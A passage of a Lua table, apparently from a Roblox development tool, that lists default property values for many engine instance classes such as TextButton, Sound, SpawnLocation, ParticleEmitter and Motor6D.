		[""BackgroundTransparency""] = 0,
		[""BorderColor3""] = Color3.new(0.105882, 0.164706, 0.207843),
		[""BorderSizePixel""] = 1,
		[""ClipsDescendants""] = false,
		[""LayoutOrder""] = 0,
		[""NextSelectionDown""] = ""nill"",
		[""NextSelectionLeft""] = ""nill"",
		[""NextSelectionRight""] = ""nill"",
		[""NextSelectionUp""] = ""nill"",
		[""Position""] = UDim2.new(UDim.new(0, 0), UDim.new(0, 0)),
		[""Rotation""] = 0,
		[""Selectable""] = false,
		[""SelectionImageObject""] = ""nill"",
		[""Size""] = UDim2.new(UDim.new(0, 0), UDim.new(0, 0)),
		[""SizeConstraint""] = Enum.SizeConstraint.RelativeXY,
		[""Visible""] = true,
		[""ZIndex""] = 1,
		[""Font""] = Enum.Font.Legacy,
		[""LineHeight""] = 1,
		[""Text""] = ""Label"",
		[""TextColor3""] = Color3.new(0.105882, 0.164706, 0.207843),
		[""TextScaled""] = false,
		[""TextSize""] = 8,
		[""TextStrokeColor3""] = Color3.new(0, 0, 0),
		[""TextStrokeTransparency""] = 1,
		[""TextTransparency""] = 0,
		[""TextTruncate""] = Enum.TextTruncate.None,
		[""TextWrapped""] = false,
		[""TextXAlignment""] = Enum.TextXAlignment.Center,
		[""TextYAlignment""] = Enum.TextYAlignment.Center
	},
	[""TextButton""] = {
		[""Archivable""] = true,
		[""Name""] = ""TextButton"",
		[""Parent""] = ""nill"",
		[""AutoLocalize""] = true,
		[""RootLocalizationTable""] = ""nill"",
		[""Active""] = true,
		[""AnchorPoint""] = Vector2.new(0, 0),
		[""BackgroundColor3""] = Color3.new(0.639216, 0.635294, 0.647059),
		[""BackgroundTransparency""] = 0,
		[""BorderColor3""] = Color3.new(0.105882, 0.164706, 0.207843),
		[""BorderSizePixel""] = 1,
		[""ClipsDescendants""] = false,
		[""LayoutOrder""] = 0,
		[""NextSelectionDown""] = ""nill"",
		[""NextSelectionLeft""] = ""nill"",
		[""NextSelectionRight""] = ""nill"",
		[""NextSelectionUp""] = ""nill"",
		[""Position""] = UDim2.new(UDim.new(0, 0), UDim.new(0, 0)),
		[""Rotation""] = 0,
		[""Selectable""] = true,
		[""SelectionImageObject""] = ""nill"",
		[""Size""] = UDim2.new(UDim.new(0, 0), UDim.new(0, 0)),
		[""SizeConstraint""] = Enum.SizeConstraint.RelativeXY,
		[""Visible""] = true,
		[""ZIndex""] = 1,
		[""AutoButtonColor""] = true,
		[""Modal""] = false,
		[""Selected""] = false,
		[""Style""] = Enum.ButtonStyle.Custom,
		[""Font""] = Enum.Font.Legacy,
		[""LineHeight""] = 1,
		[""Text""] = ""Button"",
		[""TextColor3""] = Color3.new(0.105882, 0.164706, 0.207843),
		[""TextScaled""] = false,
		[""TextSize""] = 8,
		[""TextStrokeColor3""] = Color3.new(0, 0, 0),
		[""TextStrokeTransparency""] = 1,
		[""TextTransparency""] = 0,
		[""TextTruncate""] = Enum.TextTruncate.None,
		[""TextWrapped""] = false,
		[""TextXAlignment""] = Enum.TextXAlignment.Center,
		[""TextYAlignment""] = Enum.TextYAlignment.Center
	},
	[""Sound""] = {
		[""Archivable""] = true,
		[""Name""] = ""Sound"",
		[""Parent""] = ""nill"",
		[""EmitterSize""] = 10,
		[""Looped""] = false,
		[""MaxDistance""] = 10000,
		[""PlayOnRemove""] = false,
		[""PlaybackSpeed""] = 1,
		[""Playing""] = false,
		[""RollOffMode""] = Enum.RollOffMode.Inverse,
		[""SoundGroup""] = ""nill"",
		[""SoundId""] = """",
		[""TimePosition""] = 0,
		[""Volume""] = 0.5
	},
	[""TestService""] = {
		[""Archivable""] = true,
		[""Name""] = ""TestService"",
		[""Parent""] = ""nill"",
		[""AutoRuns""] = true,
		[""Description""] = """",
		[""ExecuteWithStudioRun""] = false,
		[""Is30FpsThrottleEnabled""] = true,
		[""IsPhysicsEnvironmentalThrottled""] = true,
		[""IsSleepAllowed""] = true,
		[""NumberOfPlayers""] = 0,
		[""SimulateSecondsLag""] = 0,
		[""Timeout""] = 10
	},
	[""SurfaceSelection""] = {
		[""Archivable""] = true,
		[""Name""] = ""SurfaceSelection"",
		[""Parent""] = ""nill"",
		[""Color3""] = Color3.new(0.0509804, 0.411765, 0.67451),
		[""Transparency""] = 0,
		[""Visible""] = true,
		[""Adornee""] = ""nill"",
		[""TargetSurface""] = Enum.NormalId.Right
	},
	[""Decal""] = {
		[""Archivable""] = true,
		[""Name""] = ""Decal"",
		[""Parent""] = ""nill"",
		[""Face""] = Enum.NormalId.Front,
		[""Color3""] = Color3.new(1, 1, 1),
		[""Texture""] = """",
		[""Transparency""] = 0
	},
	[""BlurEffect""] = {
		[""Archivable""] = true,
		[""Name""] = ""Blur"",
		[""Parent""] = ""nill"",
		[""Enabled""] = true,
		[""Size""] = 24
	},
	[""SurfaceGui""] = {
		[""Archivable""] = true,
		[""Name""] = ""SurfaceGui"",
		[""Parent""] = ""nill"",
		[""AutoLocalize""] = true,
		[""RootLocalizationTable""] = ""nill"",
		[""Enabled""] = true,
		[""ResetOnSpawn""] = true,
		[""ZIndexBehavior""] = Enum.ZIndexBehavior.Global,
		[""Active""] = true,
		[""Adornee""] = ""nill"",
		[""AlwaysOnTop""] = false,
		[""CanvasSize""] = Vector2.new(800, 600),
		[""ClipsDescendants""] = false,
		[""Face""] = Enum.NormalId.Front,
		[""LightInfluence""] = 0,
		[""ToolPunchThroughDistance""] = 0,
		[""ZOffset""] = 0
	},
	[""StringValue""] = {
		[""Archivable""] = true,
		[""Name""] = ""Value"",
		[""Parent""] = ""nill"",
		[""Value""] = """"
	},
	[""ScreenGui""] = {
		[""Archivable""] = true,
		[""Name""] = ""ScreenGui"",
		[""Parent""] = ""nill"",
		[""AutoLocalize""] = true,
		[""RootLocalizationTable""] = ""nill"",
		[""Enabled""] = true,
		[""ResetOnSpawn""] = true,
		[""ZIndexBehavior""] = Enum.ZIndexBehavior.Global,
		[""DisplayOrder""] = 0,
		[""IgnoreGuiInset""] = false
	},
	[""Dialog""] = {
		[""Archivable""] = true,
		[""Name""] = ""Dialog"",
		[""Parent""] = ""nill"",
		[""BehaviorType""] = Enum.DialogBehaviorType.SinglePlayer,
		[""ConversationDistance""] = 25,
		[""GoodbyeChoiceActive""] = true,
		[""GoodbyeDialog""] = """",
		[""InUse""] = false,
		[""InitialPrompt""] = """",
		[""Purpose""] = Enum.DialogPurpose.Help,
		[""Tone""] = Enum.DialogTone.Neutral,
		[""TriggerDistance""] = 0,
		[""TriggerOffset""] = Vector3.new(0, 0, 0)
	},
	[""ForceField""] = {
		[""Archivable""] = true,
		[""Name""] = ""ForceField"",
		[""Parent""] = ""nill"",
		[""Visible""] = true
	},
	[""StarterGear""] = {
		[""Archivable""] = true,
		[""Name""] = ""StarterGear"",
		[""Parent""] = ""nill""
	},
	[""SpotLight""] = {
		[""Archivable""] = true,
		[""Name""] = ""SpotLight"",
		[""Parent""] = ""nill"",
		[""Brightness""] = 1,
		[""Color""] = Color3.new(1, 1, 1),
		[""Enabled""] = true,
		[""Shadows""] = false,
		[""Angle""] = 90,
		[""Face""] = Enum.NormalId.Front,
		[""Range""] = 16
	},
	[""RotateV""] = {
		[""Archivable""] = true,
		[""Name""] = ""RotateV"",
		[""Parent""] = ""nill"",
		[""C0""] = CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),
		[""C1""] = CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),
		[""Part0""] = ""nill"",
		[""Part1""] = ""nill"",
		[""BaseAngle""] = 0
	},
	[""BodyVelocity""] = {
		[""Archivable""] = true,
		[""Name""] = ""BodyVelocity"",
		[""Parent""] = ""nill"",
		[""MaxForce""] = Vector3.new(4000, 4000, 4000),
		[""P""] = 1250,
		[""Velocity""] = Vector3.new(0, 2, 0)
	},
	[""SpecialMesh""] = {
		[""Archivable""] = true,
		[""Name""] = ""Mesh"",
		[""Parent""] = ""nill"",
		[""Offset""] = Vector3.new(0, 0, 0),
		[""Scale""] = Vector3.new(1, 1, 1),
		[""VertexColor""] = Vector3.new(1, 1, 1),
		[""MeshId""] = """",
		[""TextureId""] = """",
		[""MeshType""] = Enum.MeshType.Head
	},
	[""SpawnLocation""] = {
		[""Archivable""] = true,
		[""Name""] = ""SpawnLocation"",
		[""Parent""] = ""nill"",
		[""Anchored""] = false,
		[""BackParamA""] = -0.5,
		[""BackParamB""] = 0.5,
		[""BackSurface""] = Enum.SurfaceType.Smooth,
		[""BackSurfaceInput""] = Enum.InputType.NoInput,
		[""BottomParamA""] = -0.5,
		[""BottomParamB""] = 0.5,
		[""BottomSurface""] = Enum.SurfaceType.Inlet,
		[""BottomSurfaceInput""] = Enum.InputType.NoInput,
		[""BrickColor""] = BrickColor.new(""Medium stone grey""),
		[""CFrame""] = CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),
		[""CanCollide""] = true,
		[""CollisionGroupId""] = 0,
		[""Color""] = Color3.new(0.639216, 0.635294, 0.647059),
		[""CustomPhysicalProperties""] = ""nill"",
		[""FrontParamA""] = -0.5,
		[""FrontParamB""] = 0.5,
		[""FrontSurface""] = Enum.SurfaceType.Smooth,
		[""FrontSurfaceInput""] = Enum.InputType.NoInput,
		[""LeftParamA""] = -0.5,
		[""LeftParamB""] = 0.5,
		[""LeftSurface""] = Enum.SurfaceType.Smooth,
		[""LeftSurfaceInput""] = Enum.InputType.NoInput,
		[""Locked""] = false,
		[""Material""] = Enum.Material.Plastic,
		[""Orientation""] = Vector3.new(0, 0, 0),
		[""Position""] = Vector3.new(0, 0, 0),
		[""Reflectance""] = 0,
		[""RightParamA""] = -0.5,
		[""RightParamB""] = 0.5,
		[""RightSurface""] = Enum.SurfaceType.Smooth,
		[""RightSurfaceInput""] = Enum.InputType.NoInput,
		[""RotVelocity""] = Vector3.new(0, 0, 0),
		[""Rotation""] = Vector3.new(0, 0, 0),
		[""Size""] = Vector3.new(4, 1.2000000476837158, 2),
		[""TopParamA""] = -0.5,
		[""TopParamB""] = 0.5,
		[""TopSurface""] = Enum.SurfaceType.Studs,
		[""TopSurfaceInput""] = Enum.InputType.NoInput,
		[""Transparency""] = 0,
		[""Velocity""] = Vector3.new(0, 0, 0),
		[""Shape""] = Enum.PartType.Block,
		[""AllowTeamChangeOnTouch""] = false,
		[""Duration""] = 10,
		[""Enabled""] = true,
		[""Neutral""] = true,
		[""TeamColor""] = BrickColor.new(""Medium stone grey"")
	},
	[""Sparkles""] = {
		[""Archivable""] = true,
		[""Name""] = ""Sparkles"",
		[""Parent""] = ""nill"",
		[""Enabled""] = true,
		[""SparkleColor""] = Color3.new(0.564706, 0.0980392, 1)
	},
	[""Color3Value""] = {
		[""Archivable""] = true,
		[""Name""] = ""Value"",
		[""Parent""] = ""nill"",
		[""Value""] = Color3.new(0, 0, 0)
	},
	[""ManualGlue""] = {
		[""Archivable""] = true,
		[""Name""] = ""ManualGlue"",
		[""Parent""] = ""nill"",
		[""C0""] = CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),
		[""C1""] = CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),
		[""Part0""] = ""nill"",
		[""Part1""] = ""nill""
	},
	[""Shirt""] = {
		[""Archivable""] = true,
		[""Name""] = ""Clothing"",
		[""Parent""] = ""nill"",
		[""ShirtTemplate""] = """"
	},
	[""Seat""] = {
		[""Archivable""] = true,
		[""Name""] = ""Seat"",
		[""Parent""] = ""nill"",
		[""Anchored""] = false,
		[""BackParamA""] = -0.5,
		[""BackParamB""] = 0.5,
		[""BackSurface""] = Enum.SurfaceType.Smooth,
		[""BackSurfaceInput""] = Enum.InputType.NoInput,
		[""BottomParamA""] = -0.5,
		[""BottomParamB""] = 0.5,
		[""BottomSurface""] = Enum.SurfaceType.Inlet,
		[""BottomSurfaceInput""] = Enum.InputType.NoInput,
		[""BrickColor""] = BrickColor.new(""Medium stone grey""),
		[""CFrame""] = CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),
		[""CanCollide""] = true,
		[""CollisionGroupId""] = 0,
		[""Color""] = Color3.new(0.639216, 0.635294, 0.647059),
		[""CustomPhysicalProperties""] = ""nill"",
		[""FrontParamA""] = -0.5,
		[""FrontParamB""] = 0.5,
		[""FrontSurface""] = Enum.SurfaceType.Smooth,
		[""FrontSurfaceInput""] = Enum.InputType.NoInput,
		[""LeftParamA""] = -0.5,
		[""LeftParamB""] = 0.5,
		[""LeftSurface""] = Enum.SurfaceType.Smooth,
		[""LeftSurfaceInput""] = Enum.InputType.NoInput,
		[""Locked""] = false,
		[""Material""] = Enum.Material.Plastic,
		[""Orientation""] = Vector3.new(0, 0, 0),
		[""Position""] = Vector3.new(0, 0, 0),
		[""Reflectance""] = 0,
		[""RightParamA""] = -0.5,
		[""RightParamB""] = 0.5,
		[""RightSurface""] = Enum.SurfaceType.Smooth,
		[""RightSurfaceInput""] = Enum.InputType.NoInput,
		[""RotVelocity""] = Vector3.new(0, 0, 0),
		[""Rotation""] = Vector3.new(0, 0, 0),
		[""Size""] = Vector3.new(4, 1.2000000476837158, 2),
		[""TopParamA""] = -0.5,
		[""TopParamB""] = 0.5,
		[""TopSurface""] = Enum.SurfaceType.Studs,
		[""TopSurfaceInput""] = Enum.InputType.NoInput,
		[""Transparency""] = 0,
		[""Velocity""] = Vector3.new(0, 0, 0),
		[""Shape""] = Enum.PartType.Block,
		[""Disabled""] = false
	},
	[""SelectionSphere""] = {
		[""Archivable""] = true,
		[""Name""] = ""SelectionSphere"",
		[""Parent""] = ""nill"",
		[""Color3""] = Color3.new(0.0509804, 0.411765, 0.67451),
		[""Transparency""] = 0,
		[""Visible""] = true,
		[""Adornee""] = ""nill"",
		[""SurfaceColor3""] = Color3.new(0.0509804, 0.411765, 0.67451),
		[""SurfaceTransparency""] = 1
	},
	[""SelectionPointLasso""] = {
		[""Archivable""] = true,
		[""Name""] = ""SelectionPointLasso"",
		[""Parent""] = ""nill"",
		[""Color3""] = Color3.new(0.0509804, 0.411765, 0.67451),
		[""Transparency""] = 0,
		[""Visible""] = true,
		[""Humanoid""] = ""nill"",
		[""Point""] = Vector3.new(0, 0, 0)
	},
	[""SelectionPartLasso""] = {
		[""Archivable""] = true,
		[""Name""] = ""SelectionPartLasso"",
		[""Parent""] = ""nill"",
		[""Color3""] = Color3.new(0.0509804, 0.411765, 0.67451),
		[""Transparency""] = 0,
		[""Visible""] = true,
		[""Humanoid""] = ""nill"",
		[""Part""] = ""nill""
	},
	[""PartOperationAsset""] = {
		[""Archivable""] = true,
		[""Name""] = ""Instance"",
		[""Parent""] = ""nill""
	},
	[""ParticleEmitter""] = {
		[""Archivable""] = true,
		[""Name""] = ""ParticleEmitter"",
		[""Parent""] = ""nill"",
		[""Acceleration""] = Vector3.new(0, 0, 0),
		[""Color""] = ColorSequence.new({
			ColorSequenceKeypoint.new(0, Color3.new(1, 1, 1)),
			ColorSequenceKeypoint.new(1, Color3.new(1, 1, 1))
		}),
		[""Drag""] = 0,
		[""EmissionDirection""] = Enum.NormalId.Top,
		[""Enabled""] = true,
		[""Lifetime""] = NumberRange.new(5, 10),
		[""LightEmission""] = 0,
		[""LightInfluence""] = 0,
		[""LockedToPart""] = false,
		[""Rate""] = 20,
		[""RotSpeed""] = NumberRange.new(0, 0),
		[""Rotation""] = NumberRange.new(0, 0),
		[""Size""] = NumberSequence.new({
			NumberSequenceKeypoint.new(0, 1),
			NumberSequenceKeypoint.new(1, 1)
		}),
		[""Speed""] = NumberRange.new(5, 5),
		[""SpreadAngle""] = Vector2.new(0, 0),
		[""Texture""] = ""rbxasset://textures/particles/sparkles_main.dds"",
		[""Transparency""] = NumberSequence.new({
			NumberSequenceKeypoint.new(0, 0),
			NumberSequenceKeypoint.new(1, 0)
		}),
		[""VelocityInheritance""] = 0,
		[""ZOffset""] = 0
	},
	[""Flag""] = {
		[""Archivable""] = true,
		[""Name""] = ""Flag"",
		[""Parent""] = ""nill"",
		[""TextureId""] = """",
		[""CanBeDropped""] = true,
		[""Enabled""] = true,
		[""Grip""] = CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),
		[""GripForward""] = Vector3.new(-0, -0, -1),
		[""GripPos""] = Vector3.new(0, 0, 0),
		[""GripRight""] = Vector3.new(1, 0, 0),
		[""GripUp""] = Vector3.new(0, 1, 0),
		[""ManualActivationOnly""] = false,
		[""RequiresHandle""] = true,
		[""ToolTip""] = """",
		[""TeamColor""] = BrickColor.new(""Medium stone grey"")
	},
	[""AlignOrientation""] = {
		[""Archivable""] = true,
		[""Name""] = ""AlignOrientation"",
		[""Parent""] = ""nill"",
		[""Attachment0""] = ""nill"",
		[""Attachment1""] = ""nill"",
		[""Color""] = BrickColor.new(""Bright blue""),
		[""Enabled""] = true,
		[""Visible""] = false,
		[""MaxAngularVelocity""] = math.huge,
		[""MaxTorque""] = 10000,
		[""PrimaryAxisOnly""] = false,
		[""ReactionTorqueEnabled""] = false,
		[""Responsiveness""] = 10,
		[""RigidityEnabled""] = false
	},
	[""SphereHandleAdornment""] = {
		[""Archivable""] = true,
		[""Name""] = ""SphereHandleAdornment"",
		[""Parent""] = ""nill"",
		[""Color3""] = Color3.new(0.0509804, 0.411765, 0.67451),
		[""Transparency""] = 0,
		[""Visible""] = true,
		[""Adornee""] = ""nill"",
		[""AlwaysOnTop""] = false,
		[""CFrame""] = CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),
		[""SizeRelativeOffset""] = Vector3.new(0, 0, 0),
		[""ZIndex""] = -1,
		[""Radius""] = 1
	},
	[""RodConstraint""] = {
		[""Archivable""] = true,
		[""Name""] = ""RodConstraint"",
		[""Parent""] = ""nill"",
		[""Attachment0""] = ""nill"",
		[""Attachment1""] = ""nill"",
		[""Color""] = BrickColor.new(""Black""),
		[""Enabled""] = true,
		[""Visible""] = false,
		[""Length""] = 5,
		[""Thickness""] = 0.10000000149011612
	},
	[""ReverbSoundEffect""] = {
		[""Archivable""] = true,
		[""Name""] = ""ReverbSoundEffect"",
		[""Parent""] = ""nill"",
		[""Enabled""] = true,
		[""Priority""] = 0,
		[""DecayTime""] = 1.5,
		[""Density""] = 1,
		[""Diffusion""] = 1,
		[""DryLevel""] = -6,
		[""WetLevel""] = 0
	},
	[""Backpack""] = {
		[""Archivable""] = true,
		[""Name""] = ""Backpack"",
		[""Parent""] = ""nill""
	},
	[""CustomEventReceiver""] = {
		[""Archivable""] = true,
		[""Name""] = ""CustomEventReceiver"",
		[""Parent""] = ""nill"",
		[""Source""] = ""nill""
	},
	[""RemoteFunction""] = {
		[""Archivable""] = true,
		[""Name""] = ""RemoteFunction"",
		[""Parent""] = ""nill""
	},
	[""Trail""] = {
		[""Archivable""] = true,
		[""Name""] = ""Trail"",
		[""Parent""] = ""nill"",
		[""Attachment0""] = ""nill"",
		[""Attachment1""] = ""nill"",
		[""Color""] = ColorSequence.new({
			ColorSequenceKeypoint.new(0, Color3.new(1, 1, 1)),
			ColorSequenceKeypoint.new(1, Color3.new(1, 1, 1))
		}),
		[""Enabled""] = true,
		[""FaceCamera""] = false,
		[""Lifetime""] = 2,
		[""LightEmission""] = 0,
		[""LightInfluence""] = 0,
		[""MaxLength""] = 0,
		[""MinLength""] = 0.10000000149011612,
		[""Texture""] = """",
		[""TextureLength""] = 1,
		[""TextureMode""] = Enum.TextureMode.Stretch,
		[""Transparency""] = NumberSequence.new({
			NumberSequenceKeypoint.new(0, 0.5),
			NumberSequenceKeypoint.new(1, 0.5)
		}),
		[""WidthScale""] = NumberSequence.new({
			NumberSequenceKeypoint.new(0, 1),
			NumberSequenceKeypoint.new(1, 1)
		})
	},
	[""Sky""] = {
		[""Archivable""] = true,
		[""Name""] = ""Sky"",
		[""Parent""] = ""nill"",
		[""CelestialBodiesShown""] = true,
		[""MoonAngularSize""] = 11,
		[""MoonTextureId""] = ""rbxasset://sky/moon.jpg"",
		[""SkyboxBk""] = ""rbxasset://textures/sky/sky512_bk.tex"",
		[""SkyboxDn""] = ""rbxasset://textures/sky/sky512_dn.tex"",
		[""SkyboxFt""] = ""rbxasset://textures/sky/sky512_ft.tex"",
		[""SkyboxLf""] = ""rbxasset://textures/sky/sky512_lf.tex"",
		[""SkyboxRt""] = ""rbxasset://textures/sky/sky512_rt.tex"",
		[""SkyboxUp""] = ""rbxasset://textures/sky/sky512_up.tex"",
		[""StarCount""] = 3000,
		[""SunAngularSize""] = 21,
		[""SunTextureId""] = ""rbxasset://sky/sun.jpg""
	},
	[""UnionOperation""] = {
		[""Archivable""] = true,
		[""Name""] = ""Union"",
		[""Parent""] = ""nill"",
		[""Anchored""] = false,
		[""BackParamA""] = -0.5,
		[""BackParamB""] = 0.5,
		[""BackSurface""] = Enum.SurfaceType.Smooth,
		[""BackSurfaceInput""] = Enum.InputType.NoInput,
		[""BottomParamA""] = -0.5,
		[""BottomParamB""] = 0.5,
		[""BottomSurface""] = Enum.SurfaceType.Smooth,
		[""BottomSurfaceInput""] = Enum.InputType.NoInput,
		[""BrickColor""] = BrickColor.new(""Institutional white""),
		[""CFrame""] = CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),
		[""CanCollide""] = true,
		[""CollisionGroupId""] = 0,
		[""Color""] = Color3.new(1, 1, 1),
		[""CustomPhysicalProperties""] = ""nill"",
		[""FrontParamA""] = -0.5,
		[""FrontParamB""] = 0.5,
		[""FrontSurface""] = Enum.SurfaceType.Smooth,
		[""FrontSurfaceInput""] = Enum.InputType.NoInput,
		[""LeftParamA""] = -0.5,
		[""LeftParamB""] = 0.5,
		[""LeftSurface""] = Enum.SurfaceType.Smooth,
		[""LeftSurfaceInput""] = Enum.InputType.NoInput,
		[""Locked""] = false,
		[""Material""] = Enum.Material.Plastic,
		[""Orientation""] = Vector3.new(0, 0, 0),
		[""Position""] = Vector3.new(0, 0, 0),
		[""Reflectance""] = 0,
		[""RightParamA""] = -0.5,
		[""RightParamB""] = 0.5,
		[""RightSurface""] = Enum.SurfaceType.Smooth,
		[""RightSurfaceInput""] = Enum.InputType.NoInput,
		[""RotVelocity""] = Vector3.new(0, 0, 0),
		[""Rotation""] = Vector3.new(0, 0, 0),
		[""Size""] = Vector3.new(4, 1.2000000476837158, 2),
		[""TopParamA""] = -0.5,
		[""TopParamB""] = 0.5,
		[""TopSurface""] = Enum.SurfaceType.Smooth,
		[""TopSurfaceInput""] = Enum.InputType.NoInput,
		[""Transparency""] = 0,
		[""Velocity""] = Vector3.new(0, 0, 0),
		[""UsePartColor""] = false
	},
	[""HopperBin""] = {
		[""Archivable""] = true,
		[""Name""] = ""HopperBin"",
		[""Parent""] = ""nill"",
		[""TextureId""] = """",
		[""Active""] = false,
		[""BinType""] = Enum.BinType.Script
	},
	[""Motor""] = {
		[""Archivable""] = true,
		[""Name""] = ""Motor"",
		[""Parent""] = ""nill"",
		[""C0""] = CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),
		[""C1""] = CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),
		[""Part0""] = ""nill"",
		[""Part1""] = ""nill"",
		[""CurrentAngle""] = 0,
		[""DesiredAngle""] = 0,
		[""MaxVelocity""] = 0
	},
	[""PluginAction""] = {
		[""Archivable""] = true,
		[""Name""] = ""Instance"",
		[""Parent""] = ""nill""
	},
	[""ParabolaAdornment""] = {
		[""Archivable""] = true,
		[""Name""] = ""ParabolaAdornment"",
		[""Parent""] = ""nill"",
		[""Color3""] = Color3.new(0.94902, 0.952941, 0.952941),
		[""Transparency""] = 0,
		[""Visible""] = true,
		[""Adornee""] = ""nill""
	},
	[""Pants""] = {
		[""Archivable""] = true,
		[""Name""] = ""Clothing"",
		[""Parent""] = ""nill"",
		[""PantsTemplate""] = """"
	},
	[""Hat""] = {
		[""Archivable""] = true,
		[""Name""] = ""Hat"",
		[""Parent""] = ""nill"",
		[""AttachmentForward""] = Vector3.new(-0, -0, -1),
		[""AttachmentPoint""] = CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),
		[""AttachmentPos""] = Vector3.new(0, 0, 0),
		[""AttachmentRight""] = Vector3.new(1, 0, 0),
		[""AttachmentUp""] = Vector3.new(0, 1, 0)
	},
	[""CompressorSoundEffect""] = {
		[""Archivable""] = true,
		[""Name""] = ""CompressorSoundEffect"",
		[""Parent""] = ""nill"",
		[""Enabled""] = true,
		[""Priority""] = 0,
		[""Attack""] = 0.10000000149011612,
		[""GainMakeup""] = 0,
		[""Ratio""] = 40,
		[""Release""] = 0.10000000149011612,
		[""SideChain""] = ""nill"",
		[""Threshold""] = -40
	},
	[""NonReplicatedCSGDictionaryService""] = {
		[""Archivable""] = true,
		[""Name""] = ""NonReplicatedCSGDictionaryService"",
		[""Parent""] = ""nill""
	},
	[""NegateOperation""] = {
		[""Archivable""] = true,
		[""Name""] = ""NegativePart"",
		[""Parent""] = ""nill"",
		[""Anchored""] = true,
		[""BackParamA""] = -0.5,
		[""BackParamB""] = 0.5,
		[""BackSurface""] = Enum.SurfaceType.Smooth,
		[""BackSurfaceInput""] = Enum.InputType.NoInput,
		[""BottomParamA""] = -0.5,
		[""BottomParamB""] = 0.5,
		[""BottomSurface""] = Enum.SurfaceType.Smooth,
		[""BottomSurfaceInput""] = Enum.InputType.NoInput,
		[""BrickColor""] = BrickColor.new(""Institutional white""),
		[""CFrame""] = CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),
		[""CanCollide""] = false,
		[""CollisionGroupId""] = 0,
		[""Color""] = Color3.new(1, 1, 1),
		[""CustomPhysicalProperties""] = ""nill"",
		[""FrontParamA""] = -0.5,
		[""FrontParamB""] = 0.5,
		[""FrontSurface""] = Enum.SurfaceType.Smooth,
		[""FrontSurfaceInput""] = Enum.InputType.NoInput,
		[""LeftParamA""] = -0.5,
		[""LeftParamB""] = 0.5,
		[""LeftSurface""] = Enum.SurfaceType.Smooth,
		[""LeftSurfaceInput""] = Enum.InputType.NoInput,
		[""Locked""] = false,
		[""Material""] = Enum.Material.Plastic,
		[""Orientation""] = Vector3.new(0, 0, 0),
		[""Position""] = Vector3.new(0, 0, 0),
		[""Reflectance""] = 0,
		[""RightParamA""] = -0.5,
		[""RightParamB""] = 0.5,
		[""RightSurface""] = Enum.SurfaceType.Smooth,
		[""RightSurfaceInput""] = Enum.InputType.NoInput,
		[""RotVelocity""] = Vector3.new(0, 0, 0),
		[""Rotation""] = Vector3.new(0, 0, 0),
		[""Size""] = Vector3.new(4, 1.2000000476837158, 2),
		[""TopParamA""] = -0.5,
		[""TopParamB""] = 0.5,
		[""TopSurface""] = Enum.SurfaceType.Smooth,
		[""TopSurfaceInput""] = Enum.InputType.NoInput,
		[""Transparency""] = 0.10000000149011612,
		[""Velocity""] = Vector3.new(0, 0, 0),
		[""UsePartColor""] = false
	},
	[""Motor6D""] = {
		[""Archivable""] = true,
		[""Name""] = ""Motor6D"",
		[""Parent""] = ""nill"",
		[""C0""] = CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),
		[""C1""] = CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),
		[""Part0""] = ""nill"",
		[""Part1""] = ""nill"",
		[""CurrentAngle""] = 0,
		[""DesiredAngle""] = 0,
		[""MaxVelocity""] = 0
	},
	[""PrismaticConstraint""] = {
		[""Archivable""] = true,
		[""Name""] = ""PrismaticConstraint"",
		[""Parent""] = ""nill"",
		[""Attachment0""] = ""nill"",
		[""Attachment1""] = ""nill"",
		[""Color""] = BrickColor.new(""New Yeller""),
		[""Enabled""] = true,
		[""Visible""] = false,
		[""ActuatorType""] = Enum.ActuatorType.None,
		[""LimitsEnabled""] = false,
		[""LowerLimit""] = 0,
		[""MotorMaxAcceleration""] = math.huge,
		[""MotorMaxForce""] = 0,
		[""Restitution""] = 0,
		[""ServoMaxForce""] = 0,
		[""Size""] = 0.15000000596046448,
		[""Speed""] = 0,
		[""TargetPosition""] = 0,
		[""UpperLimit""] = 5,
		[""Velocity""] = 0
	},
	[""ModuleScript""] = {
		[""Archivable""] = true,
		[""Name""] = ""ModuleScript"",
		[""Parent""] = ""nill"",
		[""LinkedSource""] = """"
	},
	[""SpringConstraint""] = {
		[""Archivable""] = true,
		[""Name""] = ""SpringConstraint"",
		[""Parent""] = ""nill"",
		[""Attachment0""] = ""nill"",
		[""Attachment1""] = ""nill"",
		[""Color""] = BrickColor.new(""Lemon metalic""),
		[""Enabled""] = true,
		[""Visible""] = false,
		[""Coils""] = 3,
		[""Damping""] = 0,
		[""FreeLength""] = 1,
		[""LimitsEnabled""] = false,
		[""MaxForce""] = math.huge,
		[""MaxLength""] = 5,
		[""MinLength""] = 0,
		[""Radius""] = 0.4000000059604645,
		[""Stiffness""] = 0,
		[""Thickness""] = 0.10000000149011612
	},
	[""Fire""] = {
		[""Archivable""] = true,
		[""Name""] = ""Fire"",
		[""Parent""] = ""nill"",
		[""Color""] = Color3.new(0.92549, 0.545098, 0.27451),
		[""Enabled""] = true,
		[""Heat""] = 9,
		[""SecondaryColor""] = Color3.new(0.545098, 0.313726, 0.215686),
		[""Size""] = 5
	},
	[""Tween""] = {
		[""Archivable""] = true,
		[""Name""] = ""Tween"",
		[""Parent""] = ""nill""
	},
	[""LocalScript""] = {
		[""Archivable""] = true,
		[""Name""] = ""LocalScript"",
		[""Parent""] = ""nill"",
		[""Disabled""] = false,
		[""LinkedSource""] = """"
	},
	[""BodyPosition""] = {
		[""Archivable""] = true,
		[""Name""] = ""BodyPosition"",
		[""Parent""] = ""nill"",
		[""D""] = 1250,
